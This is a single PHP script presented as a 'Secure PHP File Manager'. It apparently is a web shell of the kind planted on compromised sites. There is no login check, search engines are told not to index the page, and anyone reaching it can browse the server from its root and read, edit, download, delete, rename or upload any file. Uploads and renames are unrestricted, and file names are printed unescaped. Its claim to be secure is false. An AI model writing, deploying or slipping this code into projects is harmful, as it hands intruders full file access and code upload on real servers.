<?php
session_start();
function securePath($path) {
    $realPath = realpath($path);
    if ($realPath !== false) {
        return $realPath;
    }
    return false;
}
function listDirectories($dirPath) {
    $dirPath = securePath($dirPath);
    if (!$dirPath) {
        return "<p class='error'>Invalid directory access.</p>";
    }
    $rootPath = DIRECTORY_SEPARATOR;
    $breadcrumb = "<nav class='breadcrumb'>";
    $parts = explode(DIRECTORY_SEPARATOR, trim($dirPath, DIRECTORY_SEPARATOR));
    $currentPath = $rootPath;
    $breadcrumb .= "<a href='?dir=" . urlencode($rootPath) . "'>$rootPath</a> / ";
    foreach ($parts as $part) {
        if ($part === "") continue;
        $currentPath .= $part . DIRECTORY_SEPARATOR;
        $breadcrumb .= "<a href='?dir=" . urlencode($currentPath) . "'>" . htmlspecialchars($part) . "</a> / ";
    }
    $breadcrumb = rtrim($breadcrumb, " / ") . "</nav>";
    $folders = "";
    $files = "";
    $output = $breadcrumb;
    $output .= "<table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Permissions</th>
            <th>Owner</th>
            <th>Group</th>
            <th>Action</th>
        </tr>";
    $items = scandir($dirPath);
    foreach ($items as $item) {
        if ($item === '.') continue;
        $itemPath = realpath($dirPath . DIRECTORY_SEPARATOR . $item);
        if (!$itemPath) continue;
        $type = is_dir($itemPath) ? 'Folder' : 'File';
        $size = $type === 'File' ? formatSize(filesize($itemPath)) : '-';
        $modified = date("Y-m-d H:i:s", filemtime($itemPath));
        $permissions = getFilePermissions($itemPath);
        $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($itemPath))['name'] : 'N/A';
        $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($itemPath))['name'] : 'N/A';
        $row = "<tr>";
        if ($type == 'Folder') {
            $link = "?dir=" . urlencode($itemPath);
            $row .= "<td><a href='{$link}' class='folder'>$item</a></td>";
        } else {
            $row .= "<td class='file'>$item</td>";
        }
        $row .= "<td>$type</td>";
        $row .= "<td>$size</td>";
        $row .= "<td>$modified</td>";
        $row .= "<td>$permissions</td>";
        $row .= "<td>$owner</td>";
        $row .= "<td>$group</td>";
        $row .= "<td>";
        if ($type == 'File') {
            $encodedPath = urlencode($itemPath);
            $row .= "<a href='?edit={$encodedPath}' class='btn'>Edit</a> ";
            $row .= "<a href='?rename={$encodedPath}' class='btn'>Rename</a>";
            $row .= "<a href='?download={$encodedPath}' class='btn'>Download</a> ";
            $row .= "<a href='?delete={$encodedPath}' class='btn delete'>Delete</a> ";
        }
        $row .= "</td></tr>";
        if ($type == 'Folder') {
            $folders .= $row;
        } else {
            $files .= $row;
        }
    }
    $output .= $folders . $files;
    $output .= "</table>";
    return $output;
}
function formatSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.2f", $bytes / pow(1024, $factor)) . " " . $sizes[$factor];
}
function getFilePermissions($filePath) {
    $perms = fileperms($filePath);

    $info = [
        ($perms & 0x0100) ? 'r' : '-',
        ($perms & 0x0080) ? 'w' : '-',
        ($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x') :
            (($perms & 0x0800) ? 'S' : '-'),

        ($perms & 0x0020) ? 'r' : '-',
        ($perms & 0x0010) ? 'w' : '-',
        ($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x') :
            (($perms & 0x0400) ? 'S' : '-'),

        ($perms & 0x0004) ? 'r' : '-',
        ($perms & 0x0002) ? 'w' : '-',
        ($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') :
            (($perms & 0x0200) ? 'T' : '-'),
    ];

    return implode('', $info);
}
function deleteFile($filePath) {
    $filePath = securePath($filePath);
    if ($filePath && is_file($filePath)) {
        unlink($filePath);
    }
}
function createDirectory($dirPath, $dirName) {
    $dirPath = securePath($dirPath);
    $newDir = $dirPath . '/' . basename($dirName);
    if ($dirPath && !is_dir($newDir)) {
        mkdir($newDir, 0755);
    }
}
function createFile($dirPath, $fileName) {
    $dirPath = securePath($dirPath);
    $newFile = $dirPath . '/' . basename($fileName);
    if ($dirPath && !file_exists($newFile)) {
        touch($newFile);
    }
}
function uploadFile($dirPath) {
    $targetFile = $dirPath . '/' . basename($_FILES['uploaded_file']['name']);
    move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile);
}
function editFile($filePath) {
    $filePath = securePath($filePath);
    if (!$filePath || !is_file($filePath)) return;
    if (isset($_POST['save_file'])) {
        file_put_contents($filePath, $_POST['file_content']);
        header("Location: ?dir=" . urlencode(dirname($filePath)));
        exit;
    }
    $content = htmlspecialchars(file_get_contents($filePath));
    echo "<h2>Editing: " . basename($filePath) . "</h2>
        <form method='post'>
            <textarea name='file_content' style='width:100%;height:200px;'>$content</textarea>
            <br><br>
            <input type='submit' name='save_file' value='Save' class='btn'>
            <a href='?dir=" . urlencode(dirname($filePath)) . "' class='btn'>Cancel</a>
        </form>";
}
function renameFile($oldPath, $newName) {
    $newPath = dirname($oldPath) . '/' . $newName;
    if (!file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
}
function downloadFile($filePath) {
    $filePath = securePath($filePath);
    if ($filePath && file_exists($filePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
        readfile($filePath);
        exit;
    }
}
$currentDir = isset($_GET['dir']) ? securePath($_GET['dir']) : getcwd();
if (isset($_GET['delete']) && securePath($_GET['delete'])) {
    deleteFile($_GET['delete']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
if (isset($_POST['new_folder'])) {
    createDirectory($currentDir, $_POST['folder_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
if (isset($_POST['new_file'])) {
    createFile($currentDir, $_POST['file_name']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
if (isset($_FILES['uploaded_file'])) {
    uploadFile($currentDir);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
if (isset($_GET['download'])) {
    downloadFile($_GET['download']);
}
if (isset($_GET['edit'])) {
    editFile($_GET['edit']);
    exit;
}
if (isset($_GET['rename'])) {
    $fileToRename = $_GET['rename'];
    $currentFileName = basename($fileToRename);
    echo "
    <h2>Rename File: " . htmlspecialchars($currentFileName) . "</h2>
    <form method='post'>
        <input type='text' name='new_name' value='" . htmlspecialchars($currentFileName) . "'>
        <input type='submit' name='rename_file' value='Rename'>
        <a href='?dir=" . urlencode(dirname($fileToRename)) . "'>Cancel</a>
    </form>";
}
if (isset($_POST['rename_file']) && isset($_GET['rename'])) {
    $oldFilePath = $_GET['rename'];
    $newFileName = $_POST['new_name'];
    renameFile($oldFilePath, $newFileName);
    header("Location: ?dir=" . urlencode(dirname($oldFilePath)));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Secure PHP File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <meta name="robots" content="noindex, nofollow" />
    <style>
        body { 
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(to bottom, #1e3c72, #2a5298);
}
.btn {
    padding: 10px 16px;
    margin: 5px;
    background: #3a3a3a;
    color: white;
    text-decoration: none;
    border-radius: 5px;
    transition: all 0.3s ease;
    border: 2px solid transparent;
    display: inline-block;
    font-weight: 600;
    letter-spacing: 0.5px;
}

/* Efek hover pada tombol */
.btn:hover {
    background: #575757;
    transform: scale(1.05);
    border-color: white;
}

/* Tombol Delete */
.btn.delete {
    background: #ff3b3b;
    border-color: #ff3b3b;
}

/* Efek hover tombol delete */
.btn.delete:hover {
    background: #d63030;
    border-color: white;
    transform: scale(1.08);
}

/* Gaya tabel */
table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 20px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
}

th {
    background: rgba(0, 0, 0, 0.3);
    padding: 12px;
    text-align: left;
    font-weight: bold;
}

td {
    padding: 10px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.2);
}

tr:hover {
    background: rgba(255, 255, 255, 0.2);
    transition: background 0.3s ease;
}
        th, td { padding: 10px; border: 1px solid #ddd; }
.breadcrumb {
    margin-bottom: 15px;
    padding: 8px;
    background: #333;
    color: white;
    border-radius: 5px;
}
.breadcrumb a {
    color: #f0ad4e;
    text-decoration: none;
    margin-right: 5px;
}
.breadcrumb a:hover {
    text-decoration: underline;
}
.upload-form {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 20px;
}

.upload-form input[type="file"] {
    padding: 10px;
    border: 2px solid #ffffff;
    background: rgba(255, 255, 255, 0.1);
    color: white;
    border-radius: 5px;
}

.upload-form .btn.upload-btn {
    background: #28a745;
    border: 2px solid #28a745;
    color: white;
    padding: 10px 16px;
    border-radius: 5px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s ease;
}

.upload-form .btn.upload-btn:hover {
    background: #218838;
    transform: scale(1.05);
}
    </style>
</head>
<body>
    <h1>File Manager</h1>
    <form method="post" enctype="multipart/form-data" class="upload-form">
    <input type="file" name="uploaded_file" id="fileUpload">
    <button type="submit" class="btn upload-btn">Upload File</button>
</form>
<button class="btn create-folder-btn" onclick="createFolder()">Create Folder</button><button class="btn create-file-btn" onclick="createFile()">Create File</button>
<form method="post" id="folderForm" style="display: none;">
    <input type="hidden" name="folder_name" id="folderName">
    <input type="hidden" name="new_folder" value="1">
</form>
<form method="post" id="fileForm" style="display: none;">
    <input type="hidden" name="file_name" id="fileName">
    <input type="hidden" name="new_file" value="1">
</form>
<script>
function createFolder() {
    let folderName = prompt("Enter folder name:");
    if (folderName) {
        document.getElementById("folderName").value = folderName;
        document.getElementById("folderForm").submit();
    }
}

function createFile() {
    let fileName = prompt("Enter file name:");
    if (fileName) {
        document.getElementById("fileName").value = fileName;
        document.getElementById("fileForm").submit();
    }
}
</script>

    <?= listDirectories($currentDir) ?>
</body>
</html>
